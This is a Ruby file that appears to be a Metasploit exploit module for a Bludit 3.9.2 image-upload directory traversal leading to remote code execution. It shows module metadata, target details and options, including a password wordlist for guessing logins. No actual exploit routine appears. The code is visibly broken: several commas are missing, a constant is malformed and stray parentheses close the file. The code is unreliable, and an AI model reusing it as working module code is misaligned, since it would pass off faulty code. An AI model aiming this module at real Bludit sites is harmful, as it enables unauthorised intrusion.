##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::PhpEXE
    include Msf::Exploit::FileDropper
    include Msf::Auxiliary::Report

    def initialize(info={})
      super(update_info(info,
        'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
        'Description'    => %q{
          This module exploits a vulnerability in Bludit. A remote user could abuse the uuid 
          parameter in the image upload feature in order to save a malicious payload anywhere
          onto the server, and then use a custom .htaccess file to bypass the file extension
          check to finally get remote code execution.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'chistasa'   # original discoverer
            'sinn3r'     # Metasploit Module
          ],
        'References'     =>
          [
            ['CVE', '2019-16113'],
            ['URL', 'https://github.com/bludit/bludit/issues/1081'],
            ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac']
          ],
        'Platform'       => 'php',
        'Arch'           => ARCH_PHP
        'Notes'          =>
          {
            'SideEffects' => [ IOC_IN_LOGS ],
            'Reliability' => [ REPEATABLE SESSION ]
            'Stability'   => [ CRASH_SAFE ]
          },
        'Targets'        =>
          [
            [ 'Bludit v3.9.2', {} ]
          ],
        'Privileged'     => false,
        'DisclosureDate' => "2019-09-07",
        'DefaultTarget'  => 0))
    
    register_options(
        [
            OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
            OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
            OptPath.new('PASSWORDS', [true, 'The list of passwords',
                 File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
        ])
    end

    # -- Exploit Code -- #
    # dirty workaround to remove this warning:
  # Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need a "." at the beginning.
  # see https://github.com/nahi/httpclient/issues/252
  class WebAgent
    class Cookie < HTTP::Cookie
      def domain
        self.original_domain
      end
    end
  end


      ))